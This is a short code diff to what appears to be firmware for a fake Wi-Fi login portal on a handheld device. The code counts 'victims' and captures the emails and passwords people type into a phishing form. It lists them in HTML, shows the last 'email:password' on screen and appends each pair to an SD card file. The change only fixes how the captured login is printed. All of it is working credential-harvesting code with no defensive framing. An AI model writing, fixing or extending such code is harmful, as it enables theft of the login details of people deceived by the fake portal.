@@ -244,7 +244,9 @@ void printHomeToScreen() {
   DISPLAY.println("");
   DISPLAY.printf("Victim Count: %d\n", totalCapturedCredentials);
   if (lastLogin != ""){
-    DISPLAY.printf("Last login: %d\n", lastLogin);
+    DISPLAY.printf("Last login: ");
+    DISPLAY.print(lastLogin);
+    DISPLAY.println("");
   }
   
 }
@@ -306,7 +308,7 @@ String index_POST() {
   String email = getInputValue("email");
   String password = getInputValue("password");
   capturedCredentialsHtml = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml;
-  lastLogin = email + ":" + password;
+  lastLogin = String(email + ":" + password).c_str();
 
 #if defined(HAS_SDCARD)
   appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
